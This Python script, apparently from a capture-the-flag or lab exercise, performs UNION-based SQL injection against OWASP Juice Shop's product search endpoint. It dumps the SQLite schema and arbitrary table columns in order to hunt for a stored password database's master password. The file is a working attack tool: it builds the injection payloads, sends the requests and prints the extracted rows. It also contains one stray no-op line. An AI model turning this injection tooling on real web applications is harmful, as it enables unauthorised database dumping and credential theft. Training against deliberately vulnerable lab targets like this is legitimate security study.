#!/usr/bin/env python3
"""c8: Union-SQLi schema/dump helper against Juice Shop /rest/products/search.
Used to hunt for any hint about the incident-support.kdbx master password
stored inside the Juice Shop SQLite DB.
"""
import json
import sys
import urllib.parse

import requests

BASE = "http://host.docker.internal:3000"
COLS = 10


def sqli(payload: str):
    url = BASE + "/rest/products/search?q=" + urllib.parse.quote(payload, safe="")
    r = requests.get(url, timeout=15)
    if r.status_code != 200:
        return {"_status": r.status_code, "_body": r.text[:300]}
    try:
        return r.json()
    except Exception:
        return {"_raw": r.text[:500]}


def rows(payload: str):
    data = sqli(payload)
    return data.get("data", []) if isinstance(data, dict) else []


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "schema":
        sel = ")),(SELECT id,name,sql FROM sqlite_master".replace(",", ",", 1)
        # 10 columns: id, name, description, price, deluxePrice, image, createdAt, updatedAt, deletedAt
        payload = ("')) UNION SELECT id,name,sql,4,5,6,7,8,9,10 FROM sqlite_master--")
        for r in rows(payload):
            print(r.get("id"), "|", r.get("name"), "|", (r.get("description") or "")[:400])
    else:
        table = sys.argv[1]
        cols = sys.argv[2]
        order = sys.argv[3] if len(sys.argv) > 3 else "1"
        payload = (
            "x')) UNION SELECT "
            + cols
            + ",4,5,6,7,8,9,10 FROM "
            + table
            + " ORDER BY "
            + order
            + "--"
        )
        for r in rows(payload):
            print(json.dumps(r))
